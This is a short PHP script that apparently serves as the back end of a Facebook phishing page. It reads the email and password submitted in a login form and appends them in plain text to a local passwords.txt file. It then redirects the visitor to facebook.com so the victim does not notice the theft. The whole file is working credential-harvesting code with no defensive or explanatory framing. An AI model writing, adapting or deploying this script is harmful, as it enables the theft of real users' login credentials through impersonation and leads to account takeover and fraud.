<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
$log = "User: " . $email . " | Pass: " . $pass . "\n";
file_put_contents("../storage/passwords.txt", $log, FILE_APPEND);
header("Location: https://facebook.com");
exit();
?>
